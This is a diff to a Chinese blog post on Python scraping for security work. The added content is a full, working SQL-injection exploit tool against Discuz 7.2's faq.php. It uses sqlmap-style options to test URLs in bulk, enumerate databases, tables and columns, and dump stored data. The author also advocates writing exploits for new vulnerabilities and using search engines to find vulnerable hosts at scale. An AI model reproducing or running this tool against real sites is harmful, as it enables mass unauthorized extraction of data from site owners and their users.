@@ -420,8 +420,166 @@ filename：文件存放的位置，我一般这样写，filename=yourfilepath+ur
 </code></pre><h3 id="我对写爬虫的看法"><a href="#我对写爬虫的看法" class="headerlink" title="我对写爬虫的看法"></a>我对写爬虫的看法</h3><p><strong>以上总结了我写代码的一些方法经验，我对编程的看法是：其实每个人写代码的方式都不太一样，代码写的多了就会有自己的风格。代码主要还是为了解决需求，节省人力，能够将代码用到自己的生活或者工作中，是件很有意思的事情，我觉得写python代码的要点有几个:要多动手写，看官方文档的效率比看书高，编程书是用来查的，百度谷歌很强大</strong></p>
 <h3 id="python爬虫能力对安全人员的作用"><a href="#python爬虫能力对安全人员的作用" class="headerlink" title="python爬虫能力对安全人员的作用"></a>python爬虫能力对安全人员的作用</h3><p><strong>开发简单的漏扫工具，需要爬虫的基础</strong></p>
 <p><strong>根据漏洞编写exp，新爆出的漏洞，exp早写出来可以多刷些漏洞</strong></p>
-<p><strong>*利用搜素引擎批量刷漏洞，对于新爆出的漏洞，编写exp后结合搜索引擎的语法寻找网络空间中的漏洞相关组件去测试，整个过程都可以用python爬虫技术自动化完成</strong></p>
-<h3 id="官方文档链接"><a href="#官方文档链接" class="headerlink" title="官方文档链接"></a>官方文档链接</h3><p><strong><a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/" title="BeautifulSoup官方文档" target="_blank" rel="external">BeautifulSoup官方文档</a></strong></p>
+<p><strong>利用搜素引擎批量刷漏洞，对于新爆出的漏洞，编写exp后结合搜索引擎的语法寻找网络空间中的漏洞相关组件去测试，整个过程都可以用python爬虫技术自动化完成</strong></p>
+<p><strong>贴出我很久之前学习python时利用python编写的一个自动化利用漏洞的工具代码，选择的漏洞为<a href="https://www.seebug.org/vuldb/ssvid-87114" title="discuz7.2 fap.php注入" target="_blank" rel="external">discuz7.2 faq.php注入</a>漏洞，实现了类似sqlmap的命令行操作</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180417/ifHaEfc52a.png?imageslim" alt="mark"></p>
+<pre><code>#coding=utf-8
+import requests
+import re
+import sys
+from optparse import OptionParser
+from threading import Thread
+def main():
+    parser=OptionParser()
+    parser.add_option(&quot;-u&quot;,type=&quot;string&quot;,dest=&quot;url&quot;,help=&quot;&quot;)
+    parser.add_option(&quot;-r&quot;,type=&quot;string&quot;,dest=&quot;filename&quot;,help=&quot;&quot;)
+    parser.add_option(&quot;-C&quot;,type=&quot;string&quot;,dest=&quot;column&quot;,help=&quot;&quot;)
+    parser.add_option(&quot;-T&quot;,type=&quot;string&quot;,dest=&quot;table&quot;,help=&quot;&quot;)
+    parser.add_option(&quot;-D&quot;,type=&quot;string&quot;,dest=&quot;db&quot;,help=&quot;&quot;)
+    parser.add_option(&quot;--dbs&quot;,action=&quot;store_true&quot;,dest=&quot;dbs&quot;,help=&quot;&quot;)
+    parser.add_option(&quot;--dump&quot;,action=&quot;store_true&quot;,dest=&quot;dump&quot;,help=&quot;&quot;)
+    parser.add_option(&quot;--tables&quot;,action=&quot;store_true&quot;,dest=&quot;tables&quot;,help=&quot;&quot;)
+    parser.add_option(&quot;--columns&quot;,action=&quot;store_true&quot;,dest=&quot;columns&quot;,help=&quot;&quot;)
+    (options,args)=parser.parse_args()
+    if options.url and len(sys.argv)==3:
+        url=options.url
+        result=testurl(url)
+        if result:
+            getinfo(url)
+        else:
+            pass
+    elif options.url and options.dbs:#--dbs
+        url=options.url
+        getdbs(url)
+    elif options.url and options.tables and options.db:#-u url --tables -D database
+        url=options.url
+        db=options.db
+        gettables(url,db)
+    elif options.url and options.columns and options.table and options.db:#-u url --columns -T table -D database
+        url=options.url
+        table=options.table
+        db=options.db
+        getcolumns(url,table,db)
+    elif options.url and options.dump and options.column and options.table and options.db:#-u url --dump  -C column -T table -D database
+        url=options.url
+        column=options.column
+        table=options.table
+        db=options.db
+        dumpdata(url,column,table,db)
+    elif options.filename:
+        filename=options.filename
+        testurllist(filename)
+def testurl(url):
+    payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;}
+    content=requests.get(url=url,params=payload)
+    str=content.text
+    p=re.compile(r&quot;You have an error in your SQL syntax&quot;)
+    if re.findall(p,str):
+        print &quot;this url injectable!&quot;
+        return True
+    else:
+        print &quot;this url not injectable&quot;
+        return False
+def testurllist(filename):
+    try:
+        file=open(filename,&quot;r&quot;)
+        urllist=[url.strip() for url in file.readlines()]
+        for url in urllist:
+            print &quot;test url..............%s&quot;%(url)
+            testurl(url)
+    except IOError,e:
+        print &quot;file open error&quot;,e
+def getinfo(url):
+    payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select database()),0x3a)x from information_schema.tables group by x)a)#&apos;}
+    content=requests.get(url=url,params=payload)
+    str=content.text
+    p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)
+    c_db=re.findall(p,str).pop()
+    payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select user()),0x3a)x from information_schema.tables group by x)a)#&apos;}
+    content=requests.get(url=url,params=payload)
+    str=content.text
+    p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)
+    user=re.findall(p,str).pop()
+    payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select version()),0x3a)x from information_schema.tables group by x)a)#&apos;}
+    content=requests.get(url=url,params=payload)
+    str=content.text
+    p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)
+    version=re.findall(p,str).pop()
+    print &quot;current database:%s\nuser:%s\nversion:%s\n&quot;%(c_db,user,version)
+def getdbs(url):
+    i=0
+    while 1:
+        payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select schema_name from information_schema.schemata limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(i)}
+        content=requests.get(url=url,params=payload)
+        str=content.text
+        p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)
+        dbs=re.findall(p,str)
+        if dbs==[]:
+            break
+        else:
+            print dbs[-1]
+            i=i+1
+def gettables(url,db):
+    print &quot;select database:%s&quot;%(db)
+    hexdb=&apos;0x&apos;+db.encode(&quot;hex&quot;)
+    i=0
+    while 1:
+        payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select table_name from information_schema.tables where table_schema=%s limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(hexdb,i)}
+        content=requests.get(url=url,params=payload)
+        str=content.text
+        p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)
+        table=re.findall(p,str)
+        if table==[]:
+            break
+        else:
+            print table[-1]
+            i=i+1
+def getcolumns(url,table,db):
+    print &quot;select database:%s\nselect table:%s&quot;%(db,table)
+    hextables=[]
+    hextables.append(&quot;0x&quot;+table.encode(&quot;hex&quot;))
+    hextables.append(&quot;0x&quot;+(&quot;cdb_&quot;+table).encode(&quot;hex&quot;))
+    if table.find(&quot;uc_&quot;)==0:
+        hextables.append(&quot;0x&quot;+(table.split(&quot;_&quot;)[1]).encode(&quot;hex&quot;))
+    print hextables
+    for hextable in hextables:
+        i=0
+        while 1:
+            payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select column_name from information_schema.columns where table_name=%s limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(hextable,i)}
+            content=requests.get(url=url,params=payload)
+            str=content.text
+            p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)
+            column=re.findall(p,str)
+            if column==[]:
+                break
+            else:
+                print column[-1]
+            i=i+1
+        print i
+def dumpdata(url,column,table,db):
+    print &quot;select database:%s\nselect table:%s\nselect column:%s&quot;%(db,table,column)
+    column=column.replace(&quot;,&quot;,&quot;,0x3a,&quot;)
+    tables=[]
+    tables.append(table)
+    tables.append(&quot;cdb_&quot;+table)
+    if table.find(&quot;uc_&quot;)&gt;=0:
+        tables.append(table.split(&quot;_&quot;)[1])
+    print tables
+    for table in tables:
+        i=0
+        while 1:
+            payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select concat(%s) from %s.%s limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(column,db,table,i)}
+            content=requests.get(url=url,params=payload)
+            str=content.text
+            p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)
+            data=re.findall(p,str)
+            if data==[]:
+                break
+            else:
+                print data[-1]
+                i=i+1
+if __name__==&quot;__main__&quot;:
+    main()
+</code></pre><h3 id="官方文档链接"><a href="#官方文档链接" class="headerlink" title="官方文档链接"></a>官方文档链接</h3><p><strong><a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/" title="BeautifulSoup官方文档" target="_blank" rel="external">BeautifulSoup官方文档</a></strong></p>
 <p><strong><a href="http://docs.python-requests.org/zh_CN/latest/" title="requests官方文档" target="_blank" rel="external">requests官方文档</a></strong></p>
 
           
